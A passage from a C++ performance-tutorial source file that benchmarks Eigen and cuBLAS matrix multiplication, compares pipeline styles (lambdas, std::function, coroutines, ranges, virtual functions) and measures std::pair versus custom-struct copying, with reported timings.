BENCHMARK(eigen_tops<float>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
BENCHMARK(eigen_tops<std::int16_t>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
BENCHMARK(eigen_tops<std::int8_t>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);

/**
 *  Arm provides C language extensions for half-precision numbers, like
 *  the @b `__fp16` and @b `__bf16` types. When `__ARM_BF16_FORMAT_ALTERNATIVE`
 *  is defined to 1 the only scalar instructions available are conversion
 *  intrinsics between `bfloat16_t` and `float32_t`.
 *
 *  @see Arm C extensions: https://developer.arm.com/documentation/101028/0010/C-language-extensions?lang=en
 */
#if defined(__ARM_FEATURE_FP16_FML) && defined(__ARM_FEATURE_FP16_SCALAR_ARITHMETIC)
#include <arm_fp16.h>
BENCHMARK(eigen_tops<__fp16>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
#endif

#if defined(__ARM_FEATURE_BF16) //! May not be defined even if `__ARM_FEATURE_BF16_VECTOR_ARITHMETIC` is!
#include <arm_bf16.h>
BENCHMARK(eigen_tops<__bf16>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
#endif

#if defined(__AVX512FP16__) //! With NVCC, we have to use `half`
#include <immintrin.h>
BENCHMARK(eigen_tops<_Float16>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
#endif

/**
 *  Now we can compare the theoretical limits to the actual performance
 *  of Eigen and BLAS libraries. On a dual-socket system, 192-core Intel
 *  Xeon 4 instances on AWS, we can achieve the following FMA throughput:
 *
 *                    Theoretical             OpenBLAS     Eigen
 *
 *  - `f64`           @b 4.1 T (AVX-512)      @b 3.1 T     @b 2.9 T
 *  - `f32`           @b 8.9 T (AVX-512)      @b 6.4 T     @b 7.5 T
 *  - `bf16`          @b 301 T (AMX)          -            -
 *  - `f16`           @b 35.4 T (AVX-512)     -            @b 396 G
 *  - `i16`:          @b 34.3 T (AVX-512)     -            @b 255 G
 *  - `i8` & `u8`     @b 683 T (AMX)          -            @b 182 G
 *
 *  Important to note, for different libraries and data types, the highest
 *  throughput was achieved with different shapes and the best number is shown.
 *
 *  Similarly on the dual-socket Graviton 4 instances on AWS, we can achieve:
 *
 *                    Theoretical             OpenBLAS     Eigen
 *
 *  - `f64`           @b 4.2 T                @b 1.2 T     @b 1.2 T
 *  - `f32`           @b 8.4 T                @b 2.3 T     @b 1.3 T
 *  - `bf16`          @b 20.1 T               -            -
 *  - `f16`           @b 16.8 T               -            @b 660 G
 *  - `i16`:          -                       -            @b 6.5 T
 *  - `i8` & `u8`     @b 38.2 T               -            @b 13.4 T
 *
 *  As expected, modern libraries are generally far less optimized for Arm,
 *  but for some applications dealing with 8-bit integers, Eigen can be good
 *  enough.
 */

#if _LESS_SLOW_WITH_CUDA
#include <cublas_v2.h>

/**
 *  @brief  A minimalistic replacement for `std::vector`, wrapping a "Unified
 *          Memory" allocation managed by @b `cudaMallocManaged`.
 *
 *  "Unified Memory" is a single memory space accessible by both the host (CPU)
 *  and some external device (like a GPU). It simplifies memory management by
 *  outsourcing memory migration to the system, but can introduce performance
 *  considerations due to page migrations. Those can be mitigated by using
 *  `cudaMemAdvise` and `cudaMemPrefetchAsync` to control memory placement,
 *  but are more relevant for linear-complexity problems.
 *
 *  Nvidia's NVLink is just one of the examples of underlying technologies used
 *  in HPC. Compute Express Link @b (CXL) is another emerging standard that has
 *  the potential to provide shared memory across CPUs, GPUs, and accelerators.
 */
template <typename type_>
class unified_array {
    type_ *data_ = nullptr;
    std::size_t size_ = 0;

  public:
    unified_array(std::size_t size) : size_(size) {
        if (cudaMallocManaged(&data_, sizeof(type_) * size_) != cudaSuccess) throw std::bad_alloc();
    }

    ~unified_array() noexcept { cudaFree(data_); }

    type_ *begin() const noexcept { return data_; }
    type_ *end() const noexcept { return data_ + size_; }
    type_ &operator[](std::size_t index) noexcept { return data_[index]; }
    type_ operator[](std::size_t index) const noexcept { return data_[index]; }
    std::size_t size() const noexcept { return size_; }
};

template <typename>
struct dependent_false : std::false_type {};

template <typename input_scalar_type_, typename output_scalar_type_ = input_scalar_type_>
static void cublas_tops(bm::State &state) {
    // Matrix size and leading dimensions
    std::size_t n = static_cast<std::size_t>(state.range(0));
    int lda = static_cast<int>(n), ldb = static_cast<int>(n), ldc = static_cast<int>(n);
    constexpr bool same_type = std::is_same_v<input_scalar_type_, output_scalar_type_>;

    // Unified memory for large matrices
    unified_array<input_scalar_type_> a(n * n), b(n * n);
    unified_array<output_scalar_type_> c(n * n);

    // With unified memory, we don't even need Thrust to initialize the data
    std::iota(a.begin(), a.end(), 0);
    std::iota(b.begin(), b.end(), 0);
    std::fill(c.begin(), c.end(), 0);

    // cuBLAS handle
    cublasHandle_t handle;
    cublasCreate(&handle);

    // Perform the GEMM operation
    // https://docs.nvidia.com/cuda/cublas/#cublas-t-gemm
    for (auto _ : state) {
        if constexpr (std::is_same_v<input_scalar_type_, float> && same_type) {
            input_scalar_type_ alpha = 1, beta = 0;
            cublasSgemm(                                   //
                handle, CUBLAS_OP_N, CUBLAS_OP_N, n, n, n, //
                &alpha, a.begin(), lda, b.begin(), ldb,    //
                &beta, c.begin(), ldc);
        }
        else if constexpr (std::is_same_v<input_scalar_type_, double> && same_type) {
            input_scalar_type_ alpha = 1, beta = 0;
            cublasDgemm(                                   //
                handle, CUBLAS_OP_N, CUBLAS_OP_N, n, n, n, //
                &alpha, a.begin(), lda, b.begin(), ldb,    //
                &beta, c.begin(), ldc);
        }
        else if constexpr (std::is_same_v<input_scalar_type_, __half> && same_type) {
            input_scalar_type_ alpha = 1, beta = 0;
            cublasHgemm(                                   //
                handle, CUBLAS_OP_N, CUBLAS_OP_N, n, n, n, //
                &alpha, a.begin(), lda, b.begin(), ldb,    //
                &beta, c.begin(), ldc);
        }
        else if constexpr (std::is_same_v<input_scalar_type_, int8_t> && std::is_same_v<output_scalar_type_, int32_t>) {
            // Scaling factors must correspond to the accumulator type
            // https://docs.nvidia.com/cuda/cublas/#cublasgemmex
            int32_t alpha_int = 1, beta_int = 0;
            cublasGemmEx(                                  //
                handle, CUBLAS_OP_N, CUBLAS_OP_N, n, n, n, //
                &alpha_int, a.begin(), CUDA_R_8I, lda,     //
                b.begin(), CUDA_R_8I, ldb,                 //
                &beta_int, c.begin(), CUDA_R_32I, ldc,     //
                CUDA_R_32I, CUBLAS_GEMM_DEFAULT);
        }
        // Trigger a compile-time error for unsupported type combinations
        else {
            static_assert(dependent_false<input_scalar_type_>::value,
                          "Unsupported combination of input and output types for cuBLAS");
        }

        // Synchronize to ensure that the GEMM call completes before timing stops.
        // Otherwise 10'000 calls will be scheduled and we will block forever until all complete!
        cudaDeviceSynchronize();
    }

    std::size_t tops_per_cycle = n * n * (n /* multiplications */ + (n - 1) /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
    state.SetComplexityN(n);

    // Cleanup
    cublasDestroy(handle);
}

// Register benchmarks
BENCHMARK(cublas_tops<float>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
BENCHMARK(cublas_tops<double>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
BENCHMARK(cublas_tops<__half>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
BENCHMARK(cublas_tops<int8_t, int32_t>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);

/**
 *  Here are the numbers one can expect on a Nvidia H200 GPUs:
 *
 *                    Datasheet    MMA kernels  cuBLAS
 *
 *  - `f64`           @b 67 T      @b 17 T      @b 60 T
 *  - `f32`           @b 67 T      -            @b 49 T
 *  - `tf32`          @b 500 T     @b 520 T     -
 *  - `bf16`          @b 1'000 T   @b 1'047 T   -
 *  - `f16`           @b 1'000 T   @b 1'056 T   @b 764 T
 *  - `i8` & `u8`     @b 2'000 T   -            @b 122 T
 *  - `b1` XOR-based  -            @b 79 T      -
 *  - `b1` AND-based  -            @b 8'439 T   -
 *
 *  For comparison, on AMD MI 300X accelerators:
 *  - 80 T arithmetic and 160 T matrix multiplications for `f64`.
 *  - 160 T arithmetic and matrix multiplications for `f32`.
 *  - 1.3 P matrix multiplications for `bf16` & `f16` into `f32`.
 *  - 2.6 P matrix multiplications for `i8` & `f8`.
 *
 *  On Nvidia GB200 super-chip with 1 Grace CPU and 2 Blackwell GPUs:
 *  - 90 T for `f64` matrix multiplications.
 *  - 90 T for `f64` arithmetic and 180 T for `f32` arithmetic.
 *  - 5 P for 19-bit `tf32` matrix multiplications into `f32`.
 *  - 10 P for `i8` matrix multiplications into `i32`.
 */

#endif // _LESS_SLOW_WITH_CUDA

#pragma endregion // Memory Bound Linear Algebra

#pragma endregion // - Memory

#pragma region - Pipelines and Abstractions

/**
 *  Designing efficient kernels is only the first step; composing them
 *  into full programs without losing performance is the real challenge.
 *
 *  Consider a hypothetical numeric processing pipeline:
 *
 *    1. Generate all integers in a given range (e.g., [1, 49]).
 *    2. Filter out integers that are perfect squares.
 *    3. Expand each remaining number into its prime factors.
 *    4. Sum all prime factors from the filtered numbers.
 *
 *  We'll explore four implementations of this pipeline:
 *
 *    - C++11 using `template`-based @b lambda functions.
 *    - C++11 using @b `std::function` for dynamic callbacks.
 *    - C++20 @b coroutines using a lightweight generator.
 *    - C++20 @b ranges with a lazily evaluated factorization.
 */
constexpr std::uint64_t pipe_start = 3;
constexpr std::uint64_t pipe_end = 49;

/**
 *  @brief  Checks if a number is a power of three using modulo division.
 *          The largest power of three fitting in a 64-bit integer is 3^40.
 */
LESS_SLOW_ALWAYS_INLINE bool is_power_of_three(std::uint64_t x) noexcept {
    constexpr std::uint64_t max_power_of_three = 12157665459056928801ull;
    return x > 0 && max_power_of_three % x == 0;
}

#pragma region Coroutines and Asynchronous Programming

/**
 *  @brief  Supplies the prime factors to a template-based callback.
 */
template <typename callback_type_>
LESS_SLOW_ALWAYS_INLINE void prime_factors_lambdas( //
    std::uint64_t input, callback_type_ &&callback) noexcept {
    // Handle factor 2 separately
    while ((input & 1) == 0) {
        callback(2);
        input >>= 1; // equivalent to `input /= 2`
    }

    // Now factor is always odd, start from 3 and go up by 2
    for (std::uint64_t factor = 3; factor * factor <= input; factor += 2) {
        while (input % factor == 0) {
            callback(factor);
            input /= factor;
        }
    }

    // If input is still greater than 1, then it's a prime factor
    if (input > 1) callback(input);
}

static void pipeline_cpp11_lambdas(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        sum = 0, count = 0;
        for (std::uint64_t value = pipe_start; value <= pipe_end; ++value) {
            if (!is_power_of_two(value) && !is_power_of_three(value))
                prime_factors_lambdas(value, [&](std::uint64_t factor) { sum += factor, count++; });
        }
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp11_lambdas);

/**
 *  A more conventional approach using @b `std::function` callbacks.
 *  While this simplifies the interface, it introduces heap allocations,
 *  and brings a lot of noisy source code into your translation unit:
 *  up to @b 27'400 lines of code, being one of the largest standard
 *  headers according to Philip Trettner's "C++ Compile Health Watchdog".
 *
 *  @see Headers length: https://artificial-mind.net/projects/compile-health/
 */
#include <functional> // `std::function`

static void for_range_stl(std::uint64_t start, std::uint64_t end, std::function<void(std::uint64_t)> const &callback) {
    for (std::uint64_t i = start; i <= end; ++i) callback(i);
}

static void filter_stl( //
    std::uint64_t value, std::function<bool(std::uint64_t)> const &predicate,
    std::function<void(std::uint64_t)> const &callback) {
    if (!predicate(value)) callback(value);
}

static void prime_factors_stl(std::uint64_t input, std::function<void(std::uint64_t)> const &callback) {
    prime_factors_lambdas(input, callback);
}

static void pipeline_cpp11_std_function(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        sum = 0, count = 0;
        for_range_stl(pipe_start, pipe_end, [&](std::uint64_t value) {
            filter_stl(value, is_power_of_two, [&](std::uint64_t value) {
                filter_stl(value, is_power_of_three, [&](std::uint64_t value) {
                    prime_factors_stl(value, [&](std::uint64_t factor) { sum += factor, count++; });
                });
            });
        });
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp11_std_function);

#if defined(__cpp_lib_coroutine) && defined(__cpp_impl_coroutine)
/**
 *  C++20 introduces @b coroutines in the language, but not in the library,
 *  so we need to provide a minimal implementation of a "generator" class.
 *
 *  @see "Asymmetric Transfer" blogposts on coroutines by Lewis Baker:
 *       https://lewissbaker.github.io/
 */
#include <coroutine> // `std::coroutine_handle`

template <typename integer_type_>
struct [[nodiscard]] toy_generator {
    using integer_type = integer_type_;

    struct promise_type {
        integer_type value_;

        std::suspend_always yield_value(integer_type value) noexcept {
            value_ = value;
            return {};
        }

        std::suspend_always initial_suspend() noexcept { return {}; }
        std::suspend_always final_suspend() noexcept { return {}; }
        toy_generator get_return_object() noexcept {
            return toy_generator {std::coroutine_handle<promise_type>::from_promise(*this)};
        }
        void return_void() noexcept {}
        void unhandled_exception() noexcept { std::terminate(); }
    };

    std::coroutine_handle<promise_type> handle_;

    explicit toy_generator(std::coroutine_handle<promise_type> h) noexcept : handle_(h) {}
    toy_generator(toy_generator const &) = delete;
    toy_generator(toy_generator &&other) noexcept : handle_(other.handle_) { other.handle_ = nullptr; }
    ~toy_generator() noexcept {
        if (handle_) handle_.destroy();
    }

    struct iterator {
        std::coroutine_handle<promise_type> handle_;

        iterator &operator++() noexcept {
            handle_.resume();
            return *this;
        }
        bool operator!=(iterator const &) const noexcept { return !handle_.done(); }
        integer_type const &operator*() const noexcept { return handle_.promise().value_; }
    };

    iterator begin() noexcept {
        handle_.resume();
        return {handle_};
    }
    iterator end() noexcept { return {nullptr}; }
};

template <typename generator_type_>
generator_type_ for_range_generator(std::uint64_t start, std::uint64_t end) noexcept {
    for (std::uint64_t value = start; value <= end; ++value) co_yield value;
}

/**
 *  Sadly, we can't mark the output type as `auto` in the coroutine, like this:
 *  auto filter_generator(auto &&values, bool (*predicate)(std::uint64_t)) noexcept;
 */
template <typename generator_type_>
generator_type_ filter_generator(generator_type_ &&values, bool (*predicate)(std::uint64_t)) noexcept {
    for (std::uint64_t value : values)
        if (!predicate(value)) co_yield value;
}

template <typename generator_type_>
generator_type_ prime_factors_generator(generator_type_ &&values) noexcept {
    for (std::uint64_t value : values) {
        // Factor out 2 first
        while ((value & 1) == 0) {
            co_yield 2;
            value >>= 1; // Equivalent to `value /= 2`
        }

        // Only consider odd factors from here on
        for (std::uint64_t factor = 3; factor * factor <= value; factor += 2) {
            while (value % factor == 0) {
                co_yield factor;
                value /= factor;
            }
        }

        // If value is still greater than 1, it's a prime number
        if (value > 1) co_yield value;
    }
}

template <typename generator_type_>
static void pipeline_cpp20_coroutine(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        auto range = for_range_generator<generator_type_>(pipe_start, pipe_end);
        auto filtered_twos = filter_generator<generator_type_>(std::move(range), is_power_of_two);
        auto filtered_threes = filter_generator<generator_type_>(std::move(filtered_twos), is_power_of_three);
        auto factors = prime_factors_generator<generator_type_>(std::move(filtered_threes));
        // Reduce
        sum = 0, count = 0;
        for (auto factor : factors) sum += factor, count++;
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

using toy_generator_t = toy_generator<std::uint64_t>;

BENCHMARK(pipeline_cpp20_coroutine<toy_generator_t>);

/**
 *  The most complete co-routine implementation is probably Lewis Baker's `cppcoro`
 *  library, currently maintained by Andreas Buhr. We can directly replace our
 *  "generator" with its `cppcoro::generator` and `cppcoro::recursive_generator` types.
 *  The `async_generator` is also available, but it's not compatible with the rest of
 *  our logic.
 *
 *  The library also implements Symmetric Transfer, which is supposed to accelerate
 *  the transfer of control between co-routines. This requires compiler support for tail
 *  calls, that isn't universally available. Moreover, the current logic of checking
 *  for compiler support only applies to Clang, so we override it here.
 */
#define CPPCORO_COMPILER_SUPPORTS_SYMMETRIC_TRANSFER 1
#include <cppcoro/generator.hpp>
#include <cppcoro/recursive_generator.hpp>

using cppcoro_generator_t = cppcoro::generator<std::uint64_t>;
using cppcoro_recursive_generator_t = cppcoro::recursive_generator<std::uint64_t>;

BENCHMARK(pipeline_cpp20_coroutine<cppcoro_generator_t>);
BENCHMARK(pipeline_cpp20_coroutine<cppcoro_recursive_generator_t>);

#pragma endregion // Coroutines and Asynchronous Programming
#endif            // defined(__cpp_lib_coroutine) && defined(__cpp_impl_coroutine)

#pragma region Ranges and Iterators
#if defined(__cpp_lib_ranges)

/**
 *  C++20 ranges are a double-edged sword. They offer powerful abstractions,
 *  making complex tasks concise and expressive. But there's a price: they can
 *  be infamously hard to debug. If your compiler ever throws a range-related
 *  error, expect a wall of template gibberish that looks like a corrupted
 *  stack trace from a parallel universe.
 *
 *  Debugging them is a remarkable exercise in patience. It's highly recommended
 *  to use `-fconcepts-diagnostics-depth=10` to make meta-template errors more
 *  readable—assuming you're into that kind of suffering.
 *
 *  One especially maddening issue is handling non-homogeneous ranges, where
 *  the begin and end iterators are different types. The end iterator is often
 *  a "sentinel" like @b `std::default_sentinel_t`. But STL concepts don't always
 *  recognize such ranges as valid, causing these assertions to fail:
 *
 *      static_assert(std::ranges::view<prime_factors_view>);
 *      static_assert(std::ranges::input_range<prime_factors_view>);
 *
 *  As a result, operations like `std::views::join` may refuse to compile.
 */

#include <iterator> // `std::input_iterator_tag`
#include <ranges>   // `std::ranges`

class prime_factors_view : public std::ranges::view_interface<prime_factors_view> {
  private:
    std::uint64_t number_ = 0;

  public:
    constexpr prime_factors_view() noexcept {}
    explicit constexpr prime_factors_view(std::uint64_t n) noexcept : number_(n) {}

    class iterator {
        std::uint64_t number_ = 0;
        std::uint64_t factor_ = 0;

        constexpr void advance() noexcept {
            // Handle factor 2 separately
            if (factor_ == 2) {
                // Keep dividing by 2 as long as the number is even
                if ((number_ & 1) == 0) {
                    number_ >>= 1; // Equivalent to `number_ /= 2`
                    return;        // Still yielding factor = 2
                }
                else { factor_ = 3; } // No more factors of 2, move on to the next odd factor (3)
            }

            // Now handle only odd factors
            while (factor_ * factor_ <= number_) {
                if (number_ % factor_ == 0) {
                    number_ /= factor_;
                    return;
                }
                factor_ += 2; // Skip even numbers
            }

            // If we exit the loop, `number_` is either 1 or a prime:
            if (number_ > 1) { factor_ = number_, number_ = 0; } // The last entry
            else { factor_ = 0; }                                // Mark as end
        }

      public:
        using value_type = std::uint64_t;
        using difference_type = std::ptrdiff_t;
        using iterator_category = std::input_iterator_tag;
        using iterator_concept = std::input_iterator_tag;

        constexpr iterator() = default;
        constexpr iterator(std::uint64_t n) noexcept : number_(n), factor_(2) { advance(); }
        constexpr std::uint64_t operator*() const noexcept { return factor_; }
        constexpr iterator &operator++() noexcept {
            advance();
            return *this;
        }
        constexpr iterator operator++(int) noexcept {
            iterator temp = *this;
            ++(*this);
            return temp;
        }

        constexpr bool operator==(iterator const &other) const noexcept { return factor_ == other.factor_; }
        constexpr bool operator!=(iterator const &other) const noexcept { return factor_ != other.factor_; }
    };

    constexpr iterator begin() const noexcept { return iterator(number_); }
    constexpr iterator end() const noexcept { return iterator(); }
};

static_assert(std::ranges::view<prime_factors_view>, "The range must model `std::ranges::view`");
static_assert(std::ranges::input_range<prime_factors_view>, "The range must model `std::ranges::input_range`");

/**
 *  @brief  Inverts the output of a boolean-returning function.
 *          Useful for search predicates.
 */
template <typename function_type_>
constexpr auto not_fn(function_type_ f) noexcept {
    return [f](auto &&...args) { return !f(std::forward<decltype(args)>(args)...); };
}

static void pipeline_cpp20_std_ranges(bm::State &state) {
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        auto pipeline =                                                                    //
            std::views::iota(pipe_start, pipe_end + 1) |                                   //
            std::views::filter(not_fn(is_power_of_two)) |                                  //
            std::views::filter(not_fn(is_power_of_three)) |                                //
            std::views::transform([](std::uint64_t x) { return prime_factors_view(x); }) | //
            std::views::join;

        // Interestingly, STL still struggles with non-homogeneous ranges,
        // if the `begin` and `end` iterators are of different types:
        //
        //      std::uint64_t sum = std::accumulate(
        //          pipeline.begin(), pipeline.end(), std::uint64_t{0});
        //
        sum = 0, count = 0;
        for (std::uint64_t factor : pipeline) sum += factor, count++;
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_cpp20_std_ranges);
#endif // defined(__cpp_lib_ranges)

/**
 *  The results for the input range [3, 49] on Intel Xeon 5 are as follows:
 *
 *      - `pipeline_cpp11_lambdas`:        @b 295ns
 *      - `pipeline_cpp11_std_function`:   @b 762ns
 *      - `pipeline_cpp20_coroutines`:     @b 717ns for toy, over @b 828ns for `cppcoro`
 *      - `pipeline_cpp20_std_ranges`:     @b 247ns
 *
 *  On Apple M2 Pro:
 *
 *      - `pipeline_cpp11_lambdas`:        @b 114ns
 *      - `pipeline_cpp11_std_function`:   @b 547ns
 *      - `pipeline_cpp20_coroutines`:     @b 705ns for toy
 *      - `pipeline_cpp20_std_ranges`:     @b N/A with Apple Clang
 *
 *  Why is STL slower than C++11 lambdas? STL's `std::function` allocates memory!
 *  Why are coroutines slower than lambdas? Coroutines allocate state and have
 *  additional overhead for resuming and suspending. Those are fairly simple to grasp.
 *
 *  But how can ranges be faster than lambdas? If that happens, the primary cause is
 *  the cost of moving data from registers to stack and back. Lambdas are closures,
 *  they capture their environment, and need to address it using the `rsp` register
 *  on x86. So if you see many `mov`-es and `rsp` arithmetic like:
 *
 *      mov     rax, QWORD PTR [rsp-16]
 *      xor     edx, edx
 *      add     rax, rcx
 *      mov     QWORD PTR [rsp-16], rax
 *      mov     rax, QWORD PTR [rsp-8]
 *      inc     rax
 *      mov     QWORD PTR [rsp-8], rax
 *      mov     rax, rsi
 *
 *  ... then you are probably looking at a lambda. Ranges, on the other hand, are
 *  lazy and don't need to capture anything. On the practical side, when implementing
 *  ranges, make sure to avoid branching even more than with regular code.
 *
 *  @see "Standard Ranges" by Eric Niebler: https://ericniebler.com/2018/12/05/standard-ranges/
 *  @see "Should we stop writing functions?"" by Jonathan Müller:
 *       https://www.think-cell.com/en/career/devblog/should-we-stop-writing-functions
 *  @see "Lambdas, Nested Functions, and Blocks, oh my!" by JeanHeyd Meneide:
 *       https://thephd.dev/lambdas-nested-functions-block-expressions-oh-my
 */
#if 0 // TODO: UnifEx needs more work
#include <unifex/adapt_stream.hpp>
#include <unifex/filter_stream.hpp>
#include <unifex/range_stream.hpp>
#include <unifex/reduce_stream.hpp>
#include <unifex/sync_wait.hpp>
#include <unifex/transform_stream.hpp>

static void pipeline_unifex(bm::State &state) {
    using sum_and_count_t = std::pair<std::uint64_t, std::uint64_t>;
    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        auto range = unifex::range_stream(pipe_start, pipe_end);
        auto filtered_twos = unifex::filter_stream(std::move(range), &is_power_of_two);
        auto filtered_threes = unifex::filter_stream(std::move(filtered_twos), &is_power_of_three);

        // TODO: There must be a better way to do this!
        auto factors = unifex::transform_stream(std::move(filtered_threes), [](std::uint64_t x) -> sum_and_count_t {
            sum_and_count_t local(0ull, 0ull);
            for (auto factor : prime_factors_view(x)) local.first += factor, local.second += 1;
            return local;
        });
        auto pipeline = unifex::reduce_stream(
            std::move(factors),
            [](sum_and_count_t total, sum_and_count_t local) -> sum_and_count_t {
                return sum_and_count_t(total.first + local.first, total.second + local.second);
            },
            sum_and_count_t(0ull, 0ull));

        // Execute the pipeline
        std::optional<sum_and_count_t> sum_and_count = unifex::sync_wait(std::move(pipeline));
        if (!sum_and_count.has_value()) state.SkipWithError("Pipeline failed");
        sum = sum_and_count->first, count = sum_and_count->second;
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_unifex);
#endif            // TODO: UnifEx needs more work
#pragma endregion // Ranges and Iterators

#pragma region Virtual Functions and Polymorphism

/**
 *  Now that we've explored how to write modern, performant C++ code,
 *  let's dive into how @b not to do it. Ironically, this style of programming
 *  is still taught in universities and used in legacy systems across the industry.
 *  If you see something like this in a codebase at a prospective job — run 🙂
 */

#include <memory> // `std::unique_ptr`

class base_virtual_class {
  public:
    virtual ~base_virtual_class() = default;
    virtual void process(std::vector<std::uint64_t> &data) const = 0;
};

class for_range_virtual : public base_virtual_class {
    std::uint64_t start_, end_;

  public:
    for_range_virtual(std::uint64_t start, std::uint64_t end) : start_(start), end_(end) {}
    void process(std::vector<std::uint64_t> &data) const override {
        data.clear();
        for (std::uint64_t value = start_; value <= end_; ++value) data.push_back(value);
    }
};

class filter_virtual : public base_virtual_class {
    bool (*predicate_)(std::uint64_t);

  public:
    filter_virtual(bool (*predicate)(std::uint64_t)) : predicate_(predicate) {}
    void process(std::vector<std::uint64_t> &data) const override {
        data.erase(std::remove_if(data.begin(), data.end(), predicate_), data.end());
    }
};

class prime_factors_virtual : public base_virtual_class {
  public:
    void process(std::vector<std::uint64_t> &data) const override {
        std::vector<std::uint64_t> expanded;
        for (auto input : data) prime_factors_lambdas(input, [&](std::uint64_t factor) { expanded.push_back(factor); });
        data.swap(expanded);
    }
};

class homogeneous_virtual_pipeline : public base_virtual_class {
    std::vector<std::unique_ptr<base_virtual_class>> stages_;

  public:
    void add_stage(std::unique_ptr<base_virtual_class> stage) { stages_.push_back(std::move(stage)); }
    void process(std::vector<std::uint64_t> &data) const override {
        for (auto const &stage : stages_) stage->process(data);
    }
};

static void pipeline_virtual_functions(bm::State &state) {
    homogeneous_virtual_pipeline pipeline;
    pipeline.add_stage(std::make_unique<for_range_virtual>(pipe_start, pipe_end));
    pipeline.add_stage(std::make_unique<filter_virtual>(is_power_of_two));
    pipeline.add_stage(std::make_unique<filter_virtual>(is_power_of_three));
    pipeline.add_stage(std::make_unique<prime_factors_virtual>());

    std::uint64_t sum = 0, count = 0;
    for (auto _ : state) {
        std::vector<std::uint64_t> data;
        pipeline.process(data);
        sum = std::accumulate(data.begin(), data.end(), std::uint64_t {0});
        count = data.size();
        if (count != 84 || sum != 645) state.SkipWithError("Incorrect result");
    }
}

BENCHMARK(pipeline_virtual_functions);

/**
 *  Performance-wise, on this specific micro-example, the virtual functions
 *  are somewhere in the middle between C++20 ranges and C++11 STL solution.
 *
 *      - `pipeline_cpp11_lambdas`:      @b 295ns
 *      - `pipeline_cpp11_std_function`: @b 831ns
 *      - `pipeline_cpp20_coroutines`:   @b 708ns
 *      - `pipeline_cpp20_std_ranges`:   @b 216ns
 *      - `pipeline_virtual_functions`:  @b 491ns
 *
 *  This code is a hazard for multiple reasons:
 *
 *  - @b Spaghetti_Code_Guaranteed: As the code evolves, additional abstraction
 *    layers will accumulate. Each layer will add new APIs and constraints until
 *    developers are forced to skip-connect grandkids to grandparents, creating
 *    a tangled mess.
 *
 *  - @b Dynamic_Allocations_Everywhere: Memory allocations occur at every stage,
 *    slowing execution and increasing fragmentation risks. In real-world scenarios,
 *    allocations frequently overlap and can overwhelm allocators, forcing them
 *    to fall back on expensive heuristics.
 *
 *  - @b Data_Packing_Overhead: This approach inevitably leads to passing data
 *    using `std::any`, arrays of strings, or even JSON objects. CPUs will spend
 *    more time chasing pointers and repacking values than performing meaningful
 *    computations.
 *
 *  - @b Unscalable_Design: Abstract Syntax Trees, interpreters, and similar
 *    constructs built this way become unsalvageable, with performance hitting a
 *    hard ceiling due to constant memory indirections and hidden costs.
 *
 *  This design is so systemically bad that after reading earlier sections, you
 *  probably don't need further convincing. We're not writing a grant proposal,
 *  so let's skip proving that bad ideas are indeed bad — and focus on the good ones.
 *
 *  Contributions are welcome — but not using `virtual` functions! 😉
 */

#pragma endregion // Virtual Functions and Polymorphism

#pragma region Inline Assembly

/**
 *  TODO: Inline Assembly version: https://github.com/ashvardanian/less_slow.cpp/issues/20
 */

#pragma endregion // Inline Assembly

#pragma endregion // - Abstractions

#pragma region - Structures, Tuples, ADTs, AOS, SOA

#pragma region Continuous Memory

/**
 *  It's a blessing if one can just use lazy processing, but realistically,
 *  every program needs memory and it's layout and used structures matter.
 *
 *  Algebraic Data Types (ADTs) are one of the most sought-after features in
 *  modern programming languages. They allow you to define complex data types
 *  by combining simpler ones.
 *
 *  In C, the only way to achieve that is by combining `stuct` and `union` types.
 *  In C++, the Standard Library provides `std::variant`, `std::tuple`, `std::pair`,
 *  `std::optional`, and many other types that can be used to create ADTs.
 *
 *  Common sense suggests that there should be no performance degradation from
 *  using the library types. Well, how hard can it be to implement a `std::pair`?
 *  StackOverflow has 5 answers to a similar question - all 5 are wrong.
 *
 *  @see StackOverflow discussion:
 *  https://stackoverflow.com/questions/3607352/struct-with-2-cells-vs-stdpair
 *
 *  Let's compare the performance of `std::pair` with a custom `pair_t` structure,
 *  made of the same two elements, also named boringly - `first` and `second`.
 */
#include <tuple> // `std::tuple`

static void packaging_custom_pairs(bm::State &state) {
    struct pair_t {
        int first;
        float second;
    };
    std::vector<pair_t> a, b;
    a.resize(1'000'000);
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_custom_pairs)->MinTime(2);

static void packaging_stl_pair(bm::State &state) {
    std::vector<std::pair<int, float>> a, b;
    a.resize(1'000'000);
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_stl_pair)->MinTime(2);

static void packaging_stl_tuple(bm::State &state) {
    std::vector<std::tuple<int, float>> a, b;
    a.resize(1'000'000);
    for (auto _ : state) bm::DoNotOptimize(b = a);
}

BENCHMARK(packaging_stl_tuple)->MinTime(2);

/**
 *  Over @b 600 microseconds for STL variants vs @b 488 microseconds for the baseline.
 *  The naive variant, avoiding STL, is faster by @b 20%.
 *
